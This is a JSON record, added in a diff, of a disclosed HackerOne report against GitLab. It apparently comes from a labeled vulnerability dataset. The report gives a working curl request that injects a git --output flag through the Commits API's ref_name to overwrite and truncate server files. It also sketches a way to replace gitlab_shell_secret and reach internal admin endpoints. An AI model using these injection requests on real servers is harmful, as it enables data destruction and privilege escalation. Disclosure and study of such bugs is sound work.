@@ -1,0 +1,53 @@
+{
+  "reported_to": "GitLab",
+  "reported_by": "vakzz ",
+  "title": "Git flag injection leading to file overwrite and potential remote code execution",
+  "content": "\nSummary\nThe ref_name in the Commits API is not sanitized, allowing for a ref starting with -- to be provided causing git to interpret it as a flag instead of as a ref.\nIf a ref_name such as --output=/tmp/some_file is used then the following command is executed by gitaly in find_commits.go:\n/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git log --format=format:%H --max-count=20 --follow --output=/tmp/some_file -- .\nfollowed by\n/opt/gitlab/embedded/bin/git --git-dir /var/opt/gitlab/git-data/repositories/@hashed/ef/2d/ef2d127de37b942baad06145e54b0c619a1f22327b2ebbcfbec78f5564afe39d.git rev-list --count --output=/tmp/some_file -- .\nThis first writes the list of commits to the file, but then the rev-list command fails but not before truncating the file.\nSteps to reproduce\nCreate a repo and add a file\nUse the commit api and pass in a ref_name such as --output=/tmp/written:\nCode 101 Bytes\n1curl 'http://4290d4225642/api/v4/projects/5/repository/commits?path=.&ref_name=--output=/tmp/written'\nSee that the file has been created:\nCode 73 Bytes\n1# ls -asl /tmp/written\n20 -rw-r--r-- 1 git git 0 Jul 22 14:56 /tmp/written\nImpact\nThe bug allows for arbitrary files to be briefly replaced with a known commit (or a list) and then truncated be empty, easily causing denial of service by replacing important files.\nOne attack scenario I thought of would be to truncate /var/opt/gitlab/gitlab-rails/etc/gitlab_shell_secret, which almost worked but ended up failing due to authenticate_by_gitlab_shell_token checking the token with unauthorized! unless Devise.secure_compare(secret_token, input) which fails if either are blank.\nThis method could potentially still work if a large number of requests were spammed, waiting until the unicorn restarts (eg for an upgrade). So long as a git log happens last before the server shuts down then the file will stay with the commit and not get truncated. I was able to reproduce this with around 32 connections then restarting:\nCode 196 Bytes\n1# gitlab-ctl restart unicorn\n2ok: run: unicorn: (pid 46755) 1s\n3root@4290d4225642:/var/opt/gitlab/gitlab-rails/etc# cat gitlab_shell_secret\n4\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n5``\n6\n7This then allows for use of the internal api:\ncurl -s 'http://4290d4225642/api/v4/internal/check?secret_token=\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588'\n{\"api_version\":\"v4\",\"gitlab_version\":\"12.0.3\",\"gitlab_rev\":\"08a51a9db93\",\"redis\":true}\ncurl -s 'http://4290d4225642/api/v4/internal/discover?secret_token=\u2588\u2588\u2588&user_id=1'\n{\"id\":1,\"name\":\"Administrator\",\"username\":\"root\"}\nCode 1.19 KiB\n1\n2### What is the current *bug* behavior?\n3\n4The `ref_name` is not sanitized\n5\n6### What is the expected *correct* behavior?\n7\n8The `ref_name` should be sanitized to prevent it being used as git command flags.\n9\n10#### Results of GitLab environment info\n11\n12System information\n13System:\n14Current User:\tgit\n15Using RVM:\tno\n16Ruby Version:\t2.6.3p62\n17Gem Version:\t2.7.9\n18Bundler Version:1.17.3\n19Rake Version:\t12.3.2\n20Redis Version:\t3.2.12\n21Git Version:\t2.21.0\n22Sidekiq Version:5.2.7\n23Go Version:\tunknown\n24\n25GitLab information\n26Version:\t12.0.3\n27Revision:\t08a51a9db93\n28Directory:\t/opt/gitlab/embedded/service/gitlab-rails\n29DB Adapter:\tPostgreSQL\n30DB Version:\t10.7\n31URL:\t\thttp://4290d4225642\n32HTTP Clone URL:\thttp://4290d4225642/some-group/some-project.git\n33SSH Clone URL:\tgit@4290d4225642:some-group/some-project.git\n34Using LDAP:\tno\n35Using Omniauth:\tyes\n36Omniauth Providers:\n37\n38GitLab Shell\n39Version:\t9.3.0\n40Repository storage paths:\n41- default: \t/var/opt/gitlab/git-data/repositories\n42GitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\n43Git:\t\t/opt/gitlab/embedded/bin/git\n44\n45## Impact\n46\n47Truncating arbitrary files and potentially replacing them with known content. This can lead to denial of service, loss of important data, and potential privilege escalation.\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": 3500,
+  "weaknesses": [
+    "Command Injection - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1576733040,
+  "report_url": "https://hackerone.com/reports/653125",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "vuln_category": "API",
+  "steps": [
+    [
+      1,
+      "Create a repo and add a file"
+    ],
+    [
+      2,
+      "Use the commit API and pass in a ref_name such as --output=/tmp/written: curl 'http://4290d4225642/api/v4/projects/5/repository/commits?path=.&ref_name=--output=/tmp/written'"
+    ],
+    [
+      3,
+      "Verify the file has been created: ls -asl /tmp/written"
+    ],
+    [
+      4,
+      "For privilege escalation, spam requests and wait for server restart to maintain file content"
+    ]
+  ],
+  "vuln_description": "The ref_name in the Commits API is not sanitized, allowing for a ref starting with -- to be provided causing git to interpret it as a flag instead of as a ref. This can lead to arbitrary file overwrite and truncation, potentially causing denial of service or privilege escalation by manipulating critical files like gitlab_shell_secret.",
+  "reason": "The vulnerability involves a straightforward injection of git flags through an unsanitized input parameter. While the impact can be severe, the discovery process is relatively simple as it only requires understanding how git interprets command-line flags and identifying an unsanitized input in the API.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves unsanitized input in the Git ref_name parameter, which is not directly related to authentication or authorization bypass. The methodology described focuses on testing authentication and authorization boundaries by swapping user sessions or resource IDs, which does not apply to this case of command injection via unsanitized input.",
+    "is_detectable": false
+  }
+}
